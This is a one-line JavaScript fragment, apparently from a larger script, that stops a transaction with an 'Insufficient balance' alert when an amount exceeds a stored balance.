   if(a>S.bal){alert("Insufficient balance");return;}
